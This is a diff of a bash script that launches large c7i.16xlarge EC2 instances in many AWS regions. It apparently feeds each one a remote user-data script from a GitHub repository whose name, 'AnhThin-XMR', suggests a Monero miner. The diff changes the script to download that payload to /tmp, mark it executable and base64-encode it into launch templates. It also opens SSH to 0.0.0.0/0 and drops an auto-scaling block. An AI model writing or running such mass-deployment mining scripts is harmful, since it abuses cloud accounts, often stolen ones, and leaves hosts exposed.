@@ -10,8 +10,10 @@ declare -A region_image_map=(
 # GitHub URL containing the User Data
 user_data_url="https://raw.githubusercontent.com/hoanglonglouis/AnhThin-XMR/refs/heads/main/AnhThinXmr"
 
-# User Data Script
-user_data_path=$(curl -s $user_data_url)
+# Download User Data Script
+user_data_path="/tmp/user_data.sh"
+curl -s $user_data_url -o $user_data_path
+chmod +x $user_data_path
 
 # Iterate over each region
 for region in "${!region_image_map[@]}"; do
@@ -50,7 +52,9 @@ for region in "${!region_image_map[@]}"; do
     fi
 
     # Check if SSH Port Rule exists
-    if ! aws ec2 describe-security-group-rules --region $region --filters Name=group-id,Values=$sg_id Name=ip-permission.from-port,Values=22 Name=ip-permission.to-port,Values=22 Name=ip-permission.cidr,Values=0.0.0.0/0 > /dev/null 2>&1; then
+    if ! aws ec2 describe-security-groups --group-ids $sg_id --region $region \
+         --query "SecurityGroups[0].IpPermissions[?FromPort==\`22\` && ToPort==\`22\` && IpRanges[?CidrIp==\`0.0.0.0/0\`]].IpRanges" \
+         --output text | grep -q "0.0.0.0/0"; then
         aws ec2 authorize-security-group-ingress \
             --group-id $sg_id \
             --protocol tcp \
@@ -67,39 +71,11 @@ for region in "${!region_image_map[@]}"; do
     launch_template_id=$(aws ec2 create-launch-template \
         --launch-template-name $launch_template_name \
         --version-description "Version1" \
-        --launch-template-data "{
-            \"ImageId\": \"$image_id\",
-            \"InstanceType\": \"c7i.16xlarge\",
-            \"KeyName\": \"$key_name\",
-            \"SecurityGroupIds\": [\"$sg_id\"],
-            \"UserData\": \"$(base64 $user_data_path | tr -d '\n')\"
-        }" \
+        --launch-template-data "{ \"ImageId\": \"$image_id\", \"InstanceType\": \"c7i.16xlarge\", \"KeyName\": \"$key_name\", \"SecurityGroupIds\": [\"$sg_id\"], \"UserData\": \"$(base64 --wrap=0 $user_data_path)\" }" \
         --region $region \
         --query "LaunchTemplate.LaunchTemplateId" \
         --output text)
     echo "Launch Template $launch_template_name created with ID $launch_template_id in $region"
-
-    # Automatically select an available Subnet ID for Auto Scaling Group
-    subnet_id=$(aws ec2 describe-subnets --region $region --query "Subnets[0].SubnetId" --output text)
-
-    if [ -z "$subnet_id" ]; then
-        echo "No available Subnet found in $region. Skipping region."
-        continue
-    fi
-
-    echo "Using Subnet ID $subnet_id for Auto Scaling Group in $region"
-
-    # Create Auto Scaling Group with selected Subnet ID
-    asg_name="SpotASG-$region"
-    aws autoscaling create-auto-scaling-group \
-        --auto-scaling-group-name $asg_name \
-        --launch-template "LaunchTemplateId=$launch_template_id,Version=1" \
-        --min-size 1 \
-        --max-size 1 \
-        --desired-capacity 1 \
-        --vpc-zone-identifier "$subnet_id" \
-        --region $region
-    echo "Auto Scaling Group $asg_name created in $region"
 
     # Launch 1 On-Demand EC2 Instance
     instance_id=$(aws ec2 run-instances \
@@ -108,7 +84,7 @@ for region in "${!region_image_map[@]}"; do
         --instance-type c7i.16xlarge \
         --key-name $key_name \
         --security-group-ids $sg_id \
-        --user-data $user_data_path \
+        --user-data file://$user_data_path \
         --region $region \
         --query "Instances[0].InstanceId" \
         --output text)
